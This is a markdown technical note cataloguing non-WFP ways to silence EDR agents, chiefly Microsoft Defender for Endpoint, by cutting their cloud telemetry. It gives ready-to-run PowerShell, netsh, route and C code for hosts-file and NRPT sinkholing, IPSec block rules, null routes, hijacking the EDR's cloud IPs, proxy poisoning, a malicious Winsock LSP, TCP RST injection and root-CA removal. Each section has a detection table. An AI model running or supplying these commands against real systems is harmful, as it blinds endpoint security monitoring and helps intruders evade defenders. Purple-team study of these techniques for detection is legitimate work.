# Beyond WFP — Alternative Network Blocking Techniques

## Motivation

All techniques in files 02-07 rely on WFP or a driver operating near WFP. Every
defender building detections around Event 5447, WFPExplorer, or pacer.sys has a
reasonable chance of catching those. This file documents techniques that bypass the
WFP/driver paradigm entirely.

**Threat model:** Blue team has perfect WFP auditing. What else works?

---

## Technique A — DNS Sinkholing: Hosts File

### How It Works

The Windows DNS resolution order is:
```
1. DNS cache
2. hosts file (C:\Windows\System32\drivers\etc\hosts)
3. DNS server
```

Adding entries to `hosts` causes the OS to resolve EDR cloud domains to `127.0.0.1`
(loopback) or any unreachable address — before any DNS query leaves the machine.

### Implementation

```powershell
# Append entries for MDE domains
$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
$edrDomains = @(
    "endpoint.security.microsoft.com",
    "*.endpoint.security.microsoft.com",
    "us.vortex-win.data.microsoft.com",
    "v20.vortex-win.data.microsoft.com",
    "*.events.data.microsoft.com",
    "settings-win.data.microsoft.com",
    "*.blob.core.windows.net"   # EDR artifact upload
)

foreach ($domain in $edrDomains) {
    Add-Content -Path $hostsPath -Value "127.0.0.1 $domain"
}

# Flush DNS cache to force immediate re-resolution
ipconfig /flushdns
```

### Caveats and Bypasses

- **DNS cache:** EDR may have already cached the IP. `ipconfig /flushdns` helps but
  does not flush the EDR process's in-process DNS cache. May need to restart EDR
  service or wait for TTL expiry.
- **Hardcoded IPs:** Some EDR agents have their cloud IPs hardcoded — hosts file
  has no effect since DNS is never consulted.
- **Wildcard limitation:** The `hosts` file does NOT support wildcards. Each
  subdomain must be listed explicitly.

### The `hosts.ics` File (Lesser-Known)

Windows also checks `C:\Windows\System32\drivers\etc\hosts.ics` (Internet Connection
Sharing host file). Same syntax, same resolution behavior. Some EDR host-file
monitoring rules only watch `hosts` — not `hosts.ics`.

```powershell
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts.ics" -Value "127.0.0.1 edr.cloud.example.com"
```

### Detection

| Artifact | Details |
|---|---|
| Event 4663 (File access) | Write to `C:\Windows\System32\drivers\etc\hosts` |
| File integrity monitoring | Hash or content change of `hosts` |
| `hosts.ics` changes | Rarely monitored — detection gap |

---

## Technique B — DNS Sinkholing: NRPT

### What Is NRPT?

The **Name Resolution Policy Table** (NRPT) is a DNS override mechanism introduced
in Windows 7 / Server 2008 R2. It allows configuring per-namespace DNS behavior:
which DNS server to use for specific domain suffixes, DNSSEC settings, etc.

The DNS client **always checks NRPT first**. Only if no NRPT rule matches does it
fall through to the system DNS configuration.

### Abuse for EDR Blocking

```powershell
# Route ALL MDE-related DNS queries to localhost (no service listening = connection failure)
Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers "127.0.0.1"
Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com"  -NameServers "127.0.0.1"
Add-DnsClientNrptRule -Namespace ".vortex-win.data.microsoft.com"   -NameServers "127.0.0.1"
Add-DnsClientNrptRule -Namespace ".events.data.microsoft.com"       -NameServers "127.0.0.1"

# Flush DNS cache
Clear-DnsClientCache
```

### Advantages Over Hosts File

- **Wildcard namespace support:** `.endpoint.security.microsoft.com` captures
  ALL subdomains — `hosts` requires explicit entries for each
- **Less obvious:** Defenders rarely watch NRPT; more monitoring exists for `hosts`
- **Group policy integration:** Can be deployed via Group Policy (if attacker controls GPO)

### Registry Location

NRPT rules are stored at:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DnsPolicyConfig\{UUID}\
```

Under each UUID key:
```
Name            REG_SZ     = "Rule Name"
ConfigOptions   REG_DWORD  = 0x8         (name servers configured)
IPSECCARestriction REG_SZ  = ""
Version         REG_DWORD  = 0x2
GenericDNSServers REG_SZ   = "127.0.0.1"
Name            REG_SZ     = ".endpoint.security.microsoft.com"
```

### Manual registry-based creation (no PowerShell cmdlet needed):

```c
// Create the UUID key
HKEY hKey;
RegCreateKeyExW(HKEY_LOCAL_MACHINE,
    L"SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters\\DnsPolicyConfig\\{DEAD-BEEF-...}",
    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

// Write values
RegSetValueExW(hKey, L"Name", 0, REG_SZ, (BYTE*)L".endpoint.security.microsoft.com", ...);
RegSetValueExW(hKey, L"GenericDNSServers", 0, REG_SZ, (BYTE*)L"127.0.0.1", ...);
RegSetValueExW(hKey, L"ConfigOptions", 0, REG_DWORD, (BYTE*)&option, sizeof(DWORD));
RegCloseKey(hKey);
```

### Detection

| Artifact | Details |
|---|---|
| Registry Event 4657 | Write to `DnsPolicyConfig` key |
| PowerShell ScriptBlock Log (4104) | `Add-DnsClientNrptRule` command captured |
| `Get-DnsClientNrptRule` | PowerShell cmdlet lists all NRPT rules — baseline/compare |

### Cleanup

```powershell
Get-DnsClientNrptRule | Where-Object { $_.NameServers -eq "127.0.0.1" } | Remove-DnsClientNrptRule
```

---

## Technique C — IPSec Filter Rules (No Kernel Driver Required)

### How It Works

Windows IPSec can block or filter traffic **independently of WFP** using its own
policy engine. Critically, you do not need to actually configure IPSec tunnels — the
filter rules alone are sufficient to drop traffic.

IPSec filters are evaluated by the IPSec Policy Agent service (`PolicyAgent`) which
interfaces with the kernel's IPSec driver (`ipsec.sys`), completely separate from BFE
and WFP.

### Implementation (via netsh)

```cmd
:: 1. Create a new IPSec policy
netsh ipsec static add policy name=EDRBlock description=EDRBlock

:: 2. Create a filter list
netsh ipsec static add filterlist name=EDRFilterList

:: 3. Add filters targeting EDR cloud IPs
::    (replace with actual EDR cloud IP ranges)
netsh ipsec static add filter filterlist=EDRFilterList srcaddr=me dstaddr=52.168.0.0 dstmask=24
netsh ipsec static add filter filterlist=EDRFilterList srcaddr=me dstaddr=13.107.246.0 dstmask=24

:: Block by domain name (Windows resolves at policy creation time)
netsh ipsec static add filter filterlist=EDRFilterList srcaddr=me dstaddr=endpoint.security.microsoft.com

:: 4. Create a block filter action
netsh ipsec static add filteraction name=BlockAction action=block

:: 5. Create the rule linking policy + filterlist + filteraction
netsh ipsec static add rule name=EDRBlockRule policy=EDRBlock filterlist=EDRFilterList filteraction=BlockAction

:: 6. Activate the policy
netsh ipsec static set policy name=EDRBlock assign=y
```

### Via PowerShell (New-NetIPsecPolicy)

```powershell
$trafficFilter = New-NetIPsecTrafficSelector `
    -RemoteAddress "52.168.0.0/24" `
    -Protocol TCP

$policy = New-NetIPsecRule `
    -DisplayName "EDRBlock" `
    -Direction Outbound `
    -Action Block `
    -LocalAddress Any `
    -RemoteAddress "52.168.0.0/24"
```

### Registry Storage

```
HKLM\Software\Policies\Microsoft\Windows\IPSec\Policy\Local\
    ipsecPolicy{GUID}
    ipsecFilter{GUID}
    ipsecAction{GUID}
    ipsecNFA{GUID}     (negotiation filter action)
```

### Key Advantages

- **No WFP filter** is created — Event 5447 is NOT generated
- **Separate policy engine** — WFPExplorer shows nothing
- **Domain name support** — specify target by hostname, not IP
- **Subnet and IP range support**

### Detection

| Artifact | Event ID | Details |
|---|---|---|
| IPSec policy applied | 5460 | A filter action was successfully modified |
| IPSec policy loaded | 5471 | IPSec policy successfully loaded |
| Registry write | 4657 | Write to `HKLM\Software\Policies\Microsoft\Windows\IPSec` |
| `netsh.exe` process | 4688 | Process creation with IPSec arguments |

### Cleanup

```cmd
netsh ipsec static delete policy name=EDRBlock
netsh ipsec static delete filterlist name=EDRFilterList
```

---

## Technique D — Null Routing / Blackhole Routing

### How It Works

Adding a static route for the EDR cloud IP subnet that points to an unreachable
gateway or the loopback interface causes all traffic to that subnet to be silently
discarded at the routing table level — before any network driver processes it.

This is purely a routing table entry — no WFP, no IPSec, no DNS.

### Implementation

```powershell
# Add blackhole route: route EDR IP to loopback (no service listening there)
# Method 1: Route to 127.0.0.1 via loopback interface
$loopbackIdx = (Get-NetAdapter | Where-Object { $_.Name -eq "Loopback Pseudo-Interface 1" }).ifIndex
New-NetRoute -DestinationPrefix "52.168.0.0/24" -InterfaceIndex $loopbackIdx -RouteMetric 1

# Method 2: Route to a non-existent gateway (drop point)
route add 52.168.0.0 MASK 255.255.255.0 192.0.2.254   # 192.0.2.x = TEST-NET, unreachable
```

#### For a specific host IP:
```cmd
route add 52.168.138.249 MASK 255.255.255.255 127.0.0.1 METRIC 1
```

#### Persistent across reboots:
```cmd
route -p add 52.168.138.249 MASK 255.255.255.255 127.0.0.1
```

### Finding EDR Cloud IPs

```powershell
# Resolve EDR domains to their IPs (before sinkholing DNS)
$edrDomains = @("endpoint.security.microsoft.com", "us.vortex-win.data.microsoft.com")
$edrIPs = $edrDomains | ForEach-Object { [System.Net.Dns]::GetHostAddresses($_) } | Select-Object -ExpandProperty IPAddressToString

# Add null routes for each resolved IP
foreach ($ip in $edrIPs) {
    New-NetRoute -DestinationPrefix "$ip/32" -InterfaceIndex $loopbackIdx -RouteMetric 1
}
```

### Detection

| Artifact | Details |
|---|---|
| Event 5152 (WFP packet drop) | May appear as routing causes drop |
| Route table change | No dedicated event; Sysmon/ETW for `route.exe` or `New-NetRoute` |
| PowerShell log (4104) | `New-NetRoute` captured |

### Cleanup

```cmd
route delete 52.168.0.0
```

---

## Technique E — IP Sinkholing (Secondary IP Assignment)

### Concept

This is the most creative technique here. Instead of dropping packets, the attacker
causes them to be **delivered locally** by claiming the EDR's cloud IP address as a
secondary IP on the local network adapter.

When the routing table sees a packet destined for an IP that is assigned to a local
interface, it delivers it locally (loopback-style). Since no local service is listening
on that IP/port combination, the connection fails — but from the network side, no packet
ever leaves the machine.

**Tool:** IPMute (by idafchev) — PowerShell script that monitors EDR connections,
captures their remote IPs, and assigns them as secondary IPs automatically.

### Manual Implementation

```powershell
# Find the target adapter GUID
$adapter = Get-NetAdapter -Name "Ethernet"
$adapterGuid = (Get-NetAdapterBinding -Name $adapter.Name -ComponentID ms_tcpip).InterfaceGuid

# Get current IPs
$currentConfig = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex

# Add the EDR cloud IP as a secondary address
$edrCloudIP = "52.168.138.249"
New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress $edrCloudIP -PrefixLength 32

# Now packets from the EDR process destined for $edrCloudIP are delivered locally
# No listener = WSAECONNREFUSED or timeout
```

Via registry (TCPIP interface config):
```
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\IPAddress
    REG_MULTI_SZ  = ["10.0.0.5", "52.168.138.249"]

HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\SubnetMask
    REG_MULTI_SZ  = ["255.255.255.0", "255.255.255.255"]
```

After registry modification: `netsh int ip reset` or adapter disable/enable to apply.

### Advantages

- No WFP changes
- No IPSec changes
- No routing changes visible in WFP tools
- Traffic never reaches the network — no external logging possible
- The EDR process receives what looks like a "server refused connection" (ECONNREFUSED)

### Disadvantages

- IP must be added per EDR cloud IP (requires prior resolution)
- Some cloud providers have many IP addresses / use Anycast
- DHCP will eventually reconfigure the adapter (if adapter is DHCP-managed)
- Requires static IP on the adapter for the secondary IP to persist

### Detection

| Artifact | Details |
|---|---|
| Registry write to TCPIP Interfaces key | Sysmon Event 13 |
| `wmiprvse.exe` registry write | Suspicious registry write by WMI process |
| `DllHost.exe` / `netsh.exe` | Unusual network adapter configuration |
| `Get-NetIPAddress` baseline | Compare secondary IP list against known-good |

---

## Technique F — WinHTTP/WinINET Proxy Poisoning

### How It Works

Many Windows services and EDR agents use `winhttp.dll` (Windows HTTP Services) for
cloud communication. WinHTTP respects machine-level proxy settings. By setting a proxy
that doesn't exist (or points to an attacker-controlled proxy that drops connections),
all WinHTTP-based EDR traffic is routed through the proxy — and fails.

### WinHTTP Machine-Level Proxy (affects all services)

```cmd
:: Set machine-level WinHTTP proxy to a non-existent server
netsh winhttp set proxy proxy-server="127.0.0.1:9999" bypass-list="<local>"

:: Verify
netsh winhttp show proxy
```

Registry equivalent:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\WinHttpSettings
    REG_BINARY  = [encoded proxy settings]
```

### MDE-Specific Static Proxy Override

Microsoft Defender for Endpoint specifically checks:
```
HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection\
    ProxyServer   REG_SZ  = "127.0.0.1:9999"
    DisableEnterpriseAuthProxy  REG_DWORD  = 1
```

Setting this to a non-existent proxy address specifically breaks MDE's telemetry
pipeline without affecting other network traffic.

```powershell
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "ProxyServer" -Value "127.0.0.1:9999"
```

### Scope of Impact

| What uses WinHTTP | Affected? |
|---|---|
| MsSense.exe (MDE sensor) | Yes — uses WinHTTP |
| Windows Update | Yes |
| Windows Store | Yes |
| Browsers (Chrome/Firefox) | No — they have their own proxy stack |
| EDRs using libcurl | No — their own TLS/TCP stack |

### Detection

| Artifact | Details |
|---|---|
| `netsh winhttp set proxy` process | Event 4688 (process creation) |
| Registry write to WATP key | `HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection` |
| WinHTTP trace log | `netsh trace start ...` captures WinHTTP errors |

---

## Technique G — Winsock Layered Service Provider (LSP)

### What Is LSP?

LSP (Layered Service Provider) is a Windows Winsock 2 extension mechanism that allows
a DLL to intercept all Winsock API calls for every process in the system. An LSP inserts
itself into the Winsock catalog and is transparently called for every `connect()`,
`send()`, `recv()` call by every application.

**Status:** Deprecated since Windows Server 2012 / Windows 8.

**Current state:** LSPs still function on Windows 10/11 but cannot be installed via
standard path without explicitly using `WSCInstallNameSpace()` as Administrator. The
deprecation means they are not well-tested and some may cause instability.

### Attack Concept

Install a malicious LSP DLL that:
1. Intercepts `connect()` calls
2. Checks if the connecting process matches an EDR name
3. If match: return `WSAEACCES` (connection refused) without forwarding to TCP/IP
4. If no match: forward to next LSP in chain (normal behavior)

### LSP Registration (Winsock Catalog)

```c
#include <ws2spi.h>

// Install the LSP into the Winsock catalog
WSAPROTOCOL_INFOW protocolInfo = { ... };  // copy from an existing provider
GUID providerGuid = { /* unique GUID */ };
int error;

WSCInstallNameSpace(
    L"MaliciousLSP",
    L"C:\\Windows\\System32\\malicious_lsp.dll",
    NS_DNS,
    0,
    &providerGuid
);

// Or install as a transport layer provider (intercepts connect/send/recv):
WSCInstallProvider(
    &providerGuid,
    L"C:\\Windows\\System32\\malicious_lsp.dll",
    &protocolInfo,
    1,
    &error
);
```

The LSP entry is stored in:
```
HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\
```

### LSP DLL Structure

The DLL must export `WSPStartup()` and implement the full `WSPPROC_TABLE`:

```c
// The critical intercept: WSPConnect
int WSPAPI WSPConnect(
    SOCKET s,
    const struct sockaddr *name,
    int namelen,
    LPWSABUF lpCallerData,
    LPWSABUF lpCalleeData,
    LPQOS lpSQOS,
    LPQOS lpGQOS,
    LPINT lpErrno)
{
    // Check if calling process is an EDR
    if (IsEdrProcess(GetCurrentProcessId())) {
        *lpErrno = WSAEACCES;
        return SOCKET_ERROR;
    }

    // Forward to next provider in chain
    return g_NextProcTable.lpWSPConnect(s, name, namelen,
        lpCallerData, lpCalleeData, lpSQOS, lpGQOS, lpErrno);
}
```

### Advantages

- No WFP filters created
- No IPSec changes
- Operates at user-mode Winsock level — below application, above kernel
- One DLL intercepts ALL processes

### Disadvantages

- **Deprecated:** May break on future Windows updates
- **Stability risk:** A buggy LSP DLL can crash every network operation on the system
- **32-bit/64-bit:** Need separate DLLs for 32-bit and 64-bit processes
- **Detection:** LSP registry catalog is easy to enumerate (`WSCEnumProtocols`)

### Detection

```powershell
# Enumerate installed LSPs
netsh winsock show catalog | findstr "LSP"

# Or via API
WSCEnumProtocols(NULL, protocols, &bufLen, &error);
```

---

## Technique H — TCP RST Injection via Raw Sockets

### Concept

Send spoofed TCP RST (Reset) segments to interrupt established EDR connections.
Unlike `SetTcpEntry()` which requires MIB_TCP_STATE_DELETE_TCB, raw RST injection
works by crafting a valid RST packet from the EDR's source port to the cloud IP.

This doesn't prevent new connections but terminates **existing** established connections,
potentially disrupting ongoing telemetry streams.

### Implementation

```c
#include <winsock2.h>
#include <ws2tcpip.h>

// Requires Administrator + raw socket privilege
SOCKET rawSock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

// Enable IP_HDRINCL to send raw IP packets (we construct the IP header)
int one = 1;
setsockopt(rawSock, IPPROTO_IP, IP_HDRINCL, (char*)&one, sizeof(one));

// Build TCP RST packet targeting the EDR connection
struct {
    // IP header
    BYTE  iph_ihl_ver;    // version=4, IHL=5
    BYTE  iph_tos;
    WORD  iph_len;
    // ...
    DWORD iph_src;        // = EDR process local IP
    DWORD iph_dst;        // = EDR cloud IP

    // TCP header
    WORD  tcph_src;       // = EDR process local port (from GetTcpTable2)
    WORD  tcph_dst;       // = EDR cloud port (usually 443)
    DWORD tcph_seq;       // = current sequence number (from GetTcpTable2)
    WORD  tcph_flags;     // = RST (0x04)
    // ...
} packet;

// Enumerate current EDR connections to get ports + seq numbers
MIB_TCPTABLE2 *tcpTable;
GetTcpTable2(tcpTable, &size, TRUE);
// Find entry matching EDR process ID
// Fill packet fields
// sendto() the raw packet

sendto(rawSock, (char*)&packet, sizeof(packet), 0,
       (sockaddr*)&dst, sizeof(dst));
```

### Using SetTcpEntry (Simpler but needs correct MIB state)

```c
// Simpler approach: use SetTcpEntry to close connections via TCP state machine
MIB_TCPROW row;
row.dwState      = MIB_TCP_STATE_DELETE_TCB;
row.dwLocalAddr  = /* EDR local IP */;
row.dwLocalPort  = /* EDR local port (host byte order) */;
row.dwRemoteAddr = /* EDR cloud IP */;
row.dwRemotePort = /* 443 */;
SetTcpEntry(&row);
```

Must be done in a loop because EDR will reconnect.

---

## Technique I — Certificate Trust Store Attacks

### Concept

Break TLS connections without touching the network stack at all. If the EDR's TLS
certificate cannot be validated, the TLS handshake fails — the EDR's own HTTP client
rejects the connection.

This targets the TLS validation layer, not the transport layer.

### Sub-technique I-1: Remove Root CA

```powershell
# Find which CA issued the EDR cloud cert
# (normally DigiCert, Microsoft, etc.)
$cert = [System.Net.ServicePointManager]::FindServicePoint("https://endpoint.security.microsoft.com")

# Remove the root CA from the machine store
$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
$store.Open("ReadWrite")
$targetCert = $store.Certificates | Where-Object { $_.Subject -like "*DigiCert*" }
$store.Remove($targetCert)
$store.Close()
```

**Effect:** All TLS connections using a certificate from that CA fail with
`ERROR_WINHTTP_SECURE_CERT_WRONG_USAGE` or `SEC_E_UNTRUSTED_ROOT`.

**Risk:** This breaks ALL TLS connections using that CA — including browsers,
Windows Update, etc. Use with caution; surgical precision requires knowing exactly
which CA the EDR uses.

### Sub-technique I-2: Add CRL / OCSP Override

Disable revocation checking or add a fake CRL entry:

```powershell
# Disable CRL checking for the machine (blunt instrument)
# This actually HELPS TLS succeed if you've compromised the cert — inverse use case

# For offensive: redirect OCSP/CRL to a server that returns "revoked"
# Requires also manipulating DNS/NRPT to redirect ocsp.digicert.com → attacker OCSP server
```

### Sub-technique I-3: Add Fake MITM CA

If the attacker controls a CA (or has stolen one):
1. Add attacker CA to machine trusted root store
2. Intercept TLS via proxy (using MITM CA to sign fake certs)
3. Inspect and drop EDR telemetry at the MITM proxy
4. (Optional: forward legitimate traffic, only drop EDR traffic — stealth)

This requires controlling the network path (router/switch position) or redirecting
via routes/DNS.

---

## Summary Table — All Alternative Techniques

| Technique | WFP Event? | Kernel? | Detection Path | Stealth Level |
|---|---|---|---|---|
| A: Hosts file | No | No | File audit 4663 | Medium |
| A2: hosts.ics | No | No | File audit (often missed) | **High** |
| B: NRPT | No | No | Registry 4657, PS log | High |
| C: IPSec filters | No | No (ipsec.sys) | Event 5460/5471 | High |
| D: Null routing | No | No | `route.exe` process | **High** |
| E: IP sinkholing | No | No | Registry TCPIP | **Very High** |
| F: WinHTTP proxy | No | No | Registry WATP key | High |
| G: Winsock LSP | No | No (user-mode DLL) | `netsh winsock show` | Medium |
| H: TCP RST inject | No | No (raw socket) | Raw socket ETW | High |
| I: Cert store attack | No | No | Cert store change | High |

---

## Sources

- Alternative EDR Silencing: `https://idafchev.github.io/blog/EDR_Silencing/`
- EDR Silencer and Beyond Part 2: `https://academy.bluraven.io/blog/edr-silencer-and-beyond-exploring-methods-to-block-edr-communication-part-2`
- EDR Silencing (Cloudbrothers Part 1): `https://cloudbrothers.info/en/edr-silencers-exploring-methods-block-edr-communication-part-1/`
- Purple Team EDR Silencing: `https://ipurple.team/2026/01/12/edr-silencing/`
- NRPT Docs: `https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn593632(v=ws.11)`
